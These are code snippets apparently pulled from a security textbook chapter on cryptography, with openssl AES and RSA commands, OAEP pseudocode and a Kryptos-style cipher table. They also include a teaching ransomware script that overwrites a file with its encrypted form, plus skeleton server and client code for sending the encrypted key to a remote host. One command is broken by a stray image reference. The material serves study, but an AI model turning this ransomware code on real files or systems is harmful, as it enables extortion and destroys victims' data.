["```\nkali@kali:~$ echo \"Top Secret Code\" > plain.txt\n```", "```\nkali@kali:~$ cat plain.txt\n```", "```\nkali@kali:~$ openssl enc -aes-256-ctr -pbkdf2 -e -a -in plain.txt -out encrypted.txt\n```", "```\nkali@kali:~$ cat encrypted.txt\n```", "```\nkali@kali:~$ openssl enc -aes-256-ctr -pbkdf2 -d -a -in encrypted.txt -out decrypted.txt\n```", "```\nkali@kali:~$ openssl genrsa -out pub_priv_pair.key 1024\n```", "```\nkali@kali:~$ openssl rsa -text -in pub_priv_pair.key\n```", "```\n RSA Private-Key: (1024 bit, 2 primes)\nmodulus:\n\n    00:b9:8c:68:20:54:be:cd:cc:2f:d9:31:f0:e1:6e:\n\n    7e:bc:c9:43:1f:30:f7:33:33:f6:74:b9:6f:d1:d9:\n\n    .....\npublicExponent: 65537 (0x10001)\nprivateExponent:\n\n    73:94:01:5c:7a:4d:6c:36:0f:6c:14:8e:be:6d:ac:\n\n    a6:7e:1b:c0:77:28:d4:8d:3e:ac:d0:c1:d5:8e:d0:\n\n    .....\nprime1:\n\n    00:dc:15:15:14:47:31:75:5d:37:33:57:e0:86:f7:\n\n    7d:2e:70:79:05:e1:e0:50:2f:20:46:60:e0:47:bf:\n\n    .....\nprime2:\n\n    00:d7:d4:84:90:34:d9:2f:b2:52:54:a0:a9:28:fd:\n\n    2a:95:fd:67:b7:81:05:69:82:12:96:63:2c:14:26:\n\n    .....\n\n................\nwriting RSA key\n\n-----BEGIN RSA PRIVATE KEY-----\nMIICWwIBAAKBgQC5jGggVL7NzC/ZMfDhbn68yUMfMPczM/Z0uW/R2YU5/KtRxPtK\n\n9nyWCf3WdUPidWzRlfBh2eJqnhDuY5abTid7rpvkU3vephDzkpeLpqPuM7TAqeOH\n\n                    ..........\n\n                    ..........\nesvJa46Lzn6bvi3LxQJAF3aKgNy4mDpTGYAud381P9d8qCxHRQMaCZ43MPLnD22q\nrf52xkSr0A6I2cJDp4KvF1EvIH8Ca2HlUrKWmCi57g==\n\n-----END RSA PRIVATE KEY-----\n```", "```\nkali@kali:~$ openssl rsa -in pub_priv_pair.key  -pubout -out public_key.key\n```", "```\nkali@kali:~$ openssl rsa  -text -pubin -in public_key.key\n\nRSA Public-Key: (1024 bit)\nModulus:\n\n    00:b9:8c:68:20:54:be:cd:cc:2f:d9:31:f0:e1:6e:\n\n    7e:bc:c9:43:1f:30:f7:33:33:f6:74:b9:6f:d1:d9:\n\n    .....\nExponent: 65537 (0x10001)\nwriting RSA key\n\n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5jGggVL7NzC/ZMfDhbn68yUMf\nMPczM/Z0uW/R2YU5/KtRxPtK9nyWCf3WdUPidWzRlfBh2eJqnhDuY5abTid7rpvk\nU3vephDzkpeLpqPuM7TAqeOHdtbmLGM5edQNmuO3Iw/VrkISQKfPp00zfcnQ4Db4\nsROIQ+sQzQv4Q7Q2bwIDAQAB\n\n-----END PUBLIC KEY-----\n```", "```\nkali@kali:~$ echo \"The cat is alive\" > plain.txt\n```", "```\nkali@kali:~$ openssl rsautl -encrypt -pubin -inkey public_key.key -in plain.\n\n\t\t\t![image](../images/arrow01.jpg) txt -out cipher.bin -oaep\n```", "```\nkali@kali:~$ openssl base64 -in cipher.bin -out cipher64.txt\n```", "```\nkali@kali:~$ cat cipher64.txt\nMAmugbm6FFNEE7+UiFTZ/b8Xn4prqHZPrKYK4IS2E31SHhKWFjjIfzXOB+sFBWBz\nZSoRpeGZ8tSj7vs/pkO/kNCDxRxelfipdOhiigFk6TqAl9JwyB5E76Bm+Ju+sMat\nh0Dx6tBjiN4RhT1hRl+9rUxdYk+IziH0jkCCngH6m5g=\n```", "```\nkali@kali:~$ openssl base64 -d -in cipher64.txt -out cipher64.bin\n```", "```\nkali@kali:~$ openssl rsautl -decrypt -inkey pub_priv_pair.key -in cipher64.bin\n\n\t\t\t -out plainD.txt -oaep\n```", "```\nkali@kali:~$ cat plainD.txt\n```", "```\nOAEP-pre(m):\n\n    r = random_nonce()\n\n ➊ X = pad(m) XOR Hash(r)\n\n    Y = r XOR Hash(X)\n\n    return X ∥ Y\n```", "```\nOAEP-post(m'):\n\n    split m'into X and Y\n\n    R = Y XOR Hash(X)\n\n    m_padded = X XOR HASH(R)\n\n    return remove_padding(m)\n```", "```\nkali@kali:~$ pip3 install cryptography\n```", "```\n   from cryptography.hazmat.backends import default_backend\n\n   from cryptography.hazmat.primitives import serialization\n\n   from cryptography.hazmat.primitives.asymmetric import padding\n\n   from cryptography.hazmat.primitives import hashes\n\n   from cryptography.fernet import Fernet\n\n➊ symmetricKey  = Fernet.generate_key()\n\n   FernetInstance = Fernet(symmetricKey)\n\n➋ with open(\"/home/prof/Desktop/Ransomware/public_key.key\", \"rb\") as key_file:\n\n       public_key = serialization.load_pem_public_key(\n\n           key_file.read(),\n\n           backend=default_backend()\n\n        )\n\n   encryptedSymmetricKey = public_key.encrypt(\n\n       symmetricKey,\n\n    ➌ padding.OAEP(\n\n           mgf=padding.MGF1(algorithm=hashes.SHA256()),\n\n        ➍ algorithm=hashes.SHA256(),\n\n           label=None\n\n       )\n\n   )\n\n➎ with open(\"encryptedSymmertricKey.key\", \"wb\") as key_file:\n\n           key_file.write(encryptedSymmetricKey)\n\n   filePath = \"/home/kali/Desktop/Ransomware/FileToEncrypt.txt\"\n\n   with open(filePath, \"rb\") as file:\n\n       file_data = file.read()\n\n    ➏ encrypted_data = FernetInstance.encrypt(file_data)\n\n   with open(filePath, \"wb\") as file:\n\n       file.write(encrypted_data)\n\n   quit()\n```", "```\nmyFile = open('output.txt', 'w')\ntry:\n\n    myFile.write('hello world!')\nfinally:\n\n    myFile.close()\n```", "```\nwith open('output.txt', 'w') as myFile:\n\n    myFile.write('hello world!')\n```", "```\nimport socketserver\n\nclass ClientHandler(socketserver.BaseRequestHandler):\n\n  ➊ def handle(self):\n\n        encrypted_key = self.request.recv(1024).strip()\n\n        print (\"Implement decryption of data \" + encrypted_key )\n\n        #------------------------------------\n\n        #      Decryption Code Here\n\n        #------------------------------------\n\n        self.request.sendall(\"send key back\")\nif __name__ == \"__main__\":\n\n    HOST, PORT = \"\", 8000\n\n  ➋ tcpServer =  socketserver.TCPServer((HOST, PORT), ClientHandler)\n\n     try:\n\n      ➌ tcpServer.serve_forever()\n\n    except:\n\n        print(\"There was an error\")\n```", "```\n   import socket\n\n                    ...\n\n   def sendEncryptedKey(eKeyFilePath):\n\n    ➊ with socket.create_connection((hostname, port)) as sock:\n\n          with open(eKeyFilePath, \"rb\") as file:\n\n           ➋ pass\n\n➌ def decryptFile(filePath, key):\n\n       pass\n```", "```\nEMUFPHZLRFAXYUSDJKZLDKRNSHGNFIVJ    ABCDEFGHIJKLMNOPQRSTUVWXYZABCD\nYQTQUXQBQVYUVLLTREVJYQTMKYRDMFD     AKRYPTOSABCDEFGHIJLMNQUVWXZKRYP\nVFPJUDEEHZWETZYVGWHKKQETGFQJNCE     BRYPTOSABCDEFGHIJLMNQUVWXZKRYPT\nGGWHKK?DQMCPFQZDQMMIAGPFXHQRLG      CYPTOSABCDEFGHIJLMNQUVWXZKRYPTO\nTIMVMZJANQLVKQEDAGDVFRPJUNGEUNA     DPTOSABCDEFGHIJLMNQUVWXZKRYPTOS\nQZGZLECGYUXUEENJTBJLBQCRTBJDFHRR    ETOSABCDEFGHIJLMNQUVWXZKRYPTOSA\nYIZETKZEMVDUFKSJHKFWHKUWQLSZFTI     FOSABCDEFGHIJLMNQUVWXZKRYPTOSAB\nHHDDDUVH?DWKBFUFPWNTDFIYCUQZERE     GSABCDEFGHIJLMNQUVWXZKRYPTOSABC\nEVLDKFEZMOQQJLTTUGSYQPFEUNLAVIDX    HABCDEFGHIJLMNQUVWXZKRYPTOSABCD\nFLGGTEZ?FKZBSFDQVGOGIPUFXHHDRKF     IBCDEFGHIJLMNQUVWXZKRYPTOSABCDE\nFHQNTGPUAECNUVPDJMQCLQUMUNEDFQ      JCDEFGHIJLMNQUVWXZKRYPTOSABCDEF\nELZZVRRGKFFVOEEXBDMVPNFQXEZLGRE     KDEFGHIJLMNQUVWXZKRYPTOSABCDEFG\nDNQFMPNZGLFLPMRJQYALMGNUVPDXVKP     LEFGHIJLMNQUVWXZKRYPTOSABCDEFGH\nDQUMEBEDMHDAFMJGZNUPLGEWJLLAETG     MFGHIJLMNQUVWXZKRYPTOSABCDEFGHI\n\nENDYAHROHNLSRHEOCPTEOIBIDYSHNAIA    NGHIJLMNQUVWXZKRYPTOSABCDEFGHIJL\nCHTNREYULDSLLSLLNOHSNOSMRWXMNE      OHIJLMNQUVWXZKRYPTOSABCDEFGHIJL\nTPRNGATIHNRARPESLNNELEBLPIIACAE     PIJLMNQUVWXZKRYPTOSABCDEFGHIJLM\nWMTWNDITEENRAHCTENEUDRETNHAEOE      QJLMNQUVWXZKRYPTOSABCDEFGHIJLMN\nTFOLSEDTIWENHAEIOYTEYQHEENCTAYCR    RLMNQUVWXZKRYPTOSABCDEFGHIJLMNQ\nEIFTBRSPAMHHEWENATAMATEGYEERLB      SMNQUVWXZKRYPTOSABCDEFGHIJLMNQU\nTEEFOASFIOTUETUAEOTOARMAEERTNRTI    TNQUVWXZKRYPTOSABCDEFGHIJLMNQUV\nBSEDDNIAAHTTMSTEWPIEROAGRIEWFEB     UQUVWXZKRYPTOSABCDEFGHIJLMNQUVW\nAECTDDHILCEIHSITEGOEAOSDDRYDLORIT   VUVWXZKRYPTOSABCDEFGHIJLMNQUVWX\nRKLMLEHAGTDHARDPNEOHMGFMFEUHE       WVWXZKRYPTOSABCDEFGHIJLMNQUVWXZ\nECDMRIPFEIMEHNLSSTTRTVDOHW?OBKR     XWXZKRYPTOSABCDEFGHIJLMNQUVWXZK\nUOXOGHULBSOLIFBBWFLRVQQPRNGKSSO     YXZKRYPTOSABCDEFGHIJLMNQUVWXZKR\nTWTQSJQSSEKZZWATJKLUDIAWINFBNYP     ZZKRYPTOSABCDEFGHIJLMNQUVWXZKRY\nVTTMZFPKWGDKZXTJCDIGKUHUAUEKCAR      ABCDEFGHIJKLMNOPQRSTUVWXYZABCD\n```"]